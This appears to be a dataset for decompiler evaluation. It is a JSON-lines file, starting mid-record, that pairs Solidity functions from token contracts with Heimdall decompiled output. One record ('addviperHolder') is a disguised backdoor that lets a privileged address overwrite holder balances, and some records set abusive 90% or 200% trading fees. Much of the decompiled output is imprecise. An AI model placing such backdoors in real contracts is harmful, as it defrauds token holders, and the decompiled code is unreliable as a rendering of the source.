0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function SplinterMagnifyBarrier(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function SplinterMagnifyBarrier(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeA1F21c4f9BDA00BEDB5871E6C0de6746E1e2929", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[5393:5427];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[5541:5577];\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function changeTicketCost(uint256 _newCost) public onlyAdmin {\\n        require(!lotteryStatus, \\\"Lottery is still running\\\"); //Lottery must not be running\\n        ticketCost = _newCost; //Set the new ticket cost\\n        emit TicketCostChanged(_newCost); //Emit the event that the ticket cost was updated\\n    }", "heimdall_decompiled_code": "function changeTicketCost(uint256 arg0) public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(!(bytes1(lotteryStatus)), \"Lottery is still running\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x18;\n        var_d = 0x4c6f7474657279206973207374696c6c2072756e6e696e670000000000000000;\n        ticketCost = arg0;\n        uint256 var_a = arg0;\n        emit TicketCostChanged(arg0);\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x2c9aF7D51e9D5450da4b4e049792811b86FBFD28", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\r\n      require(_msgSender()==_taxWallet);\r\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\r\n      _finalBuyTax=_newFee;\r\n      _finalSellTax=_newFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        require(arg0 > store_h);\n        require(!arg0 > store_h);\n        store_h = arg0;\n        store_p = arg0;\n    }"}
{"contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function updateMaxGasPriceLimit(uint256 newValue) public onlyOwner {\\r\\n        require(\\r\\n            newValue >= 10000000000,\\r\\n            \\\"max gas price cant be lower than 10 gWei\\\"\\r\\n        );\\r\\n        maxGasPriceLimit = newValue;\\r\\n    }", "heimdall_decompiled_code": "function updateMaxGasPriceLimit(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(arg0 < 0x02540be400), \"max gas price cant be lower than 10 gWei\");\n        maxGasPriceLimit = arg0;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x28;\n        var_d = 0x6d6178206761732070726963652063616e74206265206c6f776572207468616e;\n        var_e = 0x2031302067576569000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue)\\r\\n        public\\r\\n        virtual\\r\\n        returns (bool)\\r\\n    {\\r\\n        _approve(\\r\\n            _msgSender(),\\r\\n            spender,\\r\\n            _allowances[_msgSender()][spender] + addedValue\\r\\n        );\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xa60ecbb555a15D31AaCfd8d44a456A81699e4C9a", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x9C252889DA3c8cA56D96c7f75DE3884e968B7ad1", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x05f5e100) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x05f5e100) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function updateBuyFees(\r\n        uint256 _marketingFee,\r\n        uint256 _liquidityFee\r\n    ) external onlyOwner {\r\n        buyMarketingFee = _marketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee;\r\n        require(buyTotalFees <= 90, \"Must keep fees at 90% or less\");\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_p = arg0;\n        store_q = arg1;\n        require(!(arg0 > (arg1 + arg0)), \"Must keep fees at 90% or less\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        buyTotalFees = store_q + arg0;\n        require(!(0x5a < (arg1 + arg0)), \"Must keep fees at 90% or less\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1d;\n        var_d = 0x4d757374206b656570206665657320617420393025206f72206c657373000000;\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {\r\n        // Do not trigger if already in swap\r\n        require(!inSwapAndLiquify, \"Currently processing, try later.\"); \r\n        if (percent_Of_Tokens_To_Process > 100){percent_Of_Tokens_To_Process == 100;}\r\n        uint256 tokensOnContract = balanceOf(address(this));\r\n        uint256 sendTokens = tokensOnContract*percent_Of_Tokens_To_Process/100;\r\n        swapAndLiquify(sendTokens);\r\n    }", "heimdall_decompiled_code": "function process_Tokens_Now(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(noFeeToTransfer / 0x010000000000000000000000000000000000000000)), \"Currently processing, try later.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x43757272656e746c792070726f63657373696e672c20747279206c617465722e;\n        address var_f = address(this);\n        var_g = 0x01;\n        require(!storage_map_p[var_f] | (arg0 == ((storage_map_p[var_f] * arg0) / storage_map_p[var_f])));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(0x64);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        noFeeToTransfer = (0x01 * 0x010000000000000000000000000000000000000000) | (uint248(noFeeToTransfer));\n        require(!0x02 > 0xffffffffffffffff);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x41;\n        var_a = 0x02;\n        uint256 var_c = var_c + 0x60;\n        require(!0x02);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x32;\n        address var_i = address(this);\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(uniswapV2Router / 0x01).WETH(var_k); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_l == (address(var_l)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x32;\n        address var_m = address(var_l);\n        require(address(this) == 0);\n        require(!(address(uniswapV2Router / 0x01)) == 0);\n        var_f = address(this);\n        var_g = 0x02;\n        var_f = address(uniswapV2Router / 0x01);\n        address var_g = keccak256(var_f);\n        storage_map_p[var_f] = (storage_map_p[var_f] * arg0) / 0x64;\n        address var_n = (storage_map_p[var_f] * arg0) / 0x64;\n        emit Approval(address(this), address(uniswapV2Router / 0x01), (storage_map_p[var_f] * arg0) / 0x64);\n        var_n = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_o = (storage_map_p[var_f] * arg0) / 0x64;\n        uint256 var_p = 0;\n        uint256 var_q = ((0x04 + var_c) + 0xa0) - (0x04 + var_c);\n        uint256 var_r = var_c.length;\n        address var_s = address(this);\n        uint256 var_t = block.timestamp;\n        require(address(uniswapV2Router / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(uniswapV2Router / 0x01).{ value: var_p ether }Unresolved_791ac947(var_o); // call\n        (bool success, bytes memory ret0) = address(noBlackList / 0x0100).transfer(address(this).balance);\n        noFeeToTransfer = (0 * 0x010000000000000000000000000000000000000000) | (uint248(noFeeToTransfer));\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_p = 0x11;\n        var_q = 0x4552523a207a65726f2061646472657373000000000000000000000000000000;\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function showSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }", "heimdall_decompiled_code": "function showSupply() public view {\n        var_a = 0x06;\n        var_b = 0xdead;\n        uint256 var_c = 0x40 + var_c;\n        var_d = 0x1e;\n        var_e = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(store_i > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_c.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        if (!(totalSupply - store_i) > totalSupply) {\n            var_b = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_l = 0x11;\n        }\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(\r\n            newNum >= ((totalSupply() * 5) / 1000) / 1e18,\r\n            \"Cannot set maxWallet lower than 0.5%\"\r\n        );\r\n        maxWallet = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x05) & (totalSupply > 0x3333333333333333333333333333333333333333333333333333333333333333));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xEaE65155951A1B2D3Ca8C6fc19194583233B57f4", "original_solidity_code": "function setMaxamount(uint256 newTxAmt) external onlyOwner {\r\n        _maxTxAmount = _tTotal * newTxAmt/100;\r\n        require(newTxAmt >=1);\r\n    }", "heimdall_decompiled_code": "function setMaxamount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            require(0x09);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require((0x01 == 0x01) | !0x3b9aca00);\n            require(0x0a);\n            require(0x0a == 0x01);\n            require(0x0a == 0x02);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x09 > 0xff);\n            require(!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20)));\n            require(!0x09 > 0x01);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0x058959bb6d006a69D74B22B508eDED1C615E8FDB", "original_solidity_code": "function name() external view override returns (string memory) {\\r\\n      return _name;\\r\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_a & (((!bytes1(store_a)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                uint256 var_c = 0;\n                uint256 var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_a & (((!store_a) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_r) {\n            if (store_r - ((store_r / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_r / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_r / 0x02;\n                if (store_r) {\n                    if (store_r - ((store_r / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_r / 0x02) {\n                            if (0x1f < (store_r / 0x02)) {\n                                var_a = 0x09;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_r / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xd548c6Cf03b82450db5a446845DB3005e34138eE", "original_solidity_code": "function startTrading() public onlyOwner {\r\n        TradingOpen = true;\r\n        buypercent = 200;\r\n        sellpercent = 200;\r\n        transferpercent = 0;\r\n                              \r\n    }", "heimdall_decompiled_code": "function startTrading() public {\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        pair = 0x010000000000000000000000000000000000000000 | (uint248(pair));\n        store_u = 0xc8;\n        store_v = 0xc8;\n        store_w = 0;\n    }"}
{"contract_address": "0x369881c25713474CFe200dE23E54C6f19a707cDB", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        if (address(msg.sender) - 0) {\n            require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n            require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n            require(address(pool / 0x01) - 0, \"ERC20: transfer amount exceeds balance\");\n            require(address(arg0) == (address(pool / 0x01)), \"ERC20: transfer amount exceeds balance\");\n            require(maxWallet - 0, \"ERC20: transfer amount exceeds balance\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            require(!((block.timestamp - maxWallet) > block.timestamp), \"ERC20: transfer amount exceeds balance\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            require((!block.timestamp - maxWallet) | (0x2386f26fc10000 == (((block.timestamp - maxWallet) * 0x2386f26fc10000) / (block.timestamp - maxWallet))), \"ERC20: transfer amount exceeds balance\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x12;\n            require(0x3c, \"ERC20: transfer amount exceeds balance\");\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n            require(!(0x470de4df820000 > (0x470de4df820000 + (((block.timestamp - maxWallet) * 0x2386f26fc10000) / 0x3c))), \"ERC20: transfer amount exceeds balance\");\n        }\n        address var_a = address(msg.sender);\n        uint256 var_c = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x26;\n        var_h = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_i = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) == (address(owner / 0x01)), \"trading is not started\");\n        require(address(arg0) == (address(owner / 0x01)), \"trading is not started\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x16;\n        var_h = 0x74726164696e67206973206e6f74207374617274656400000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
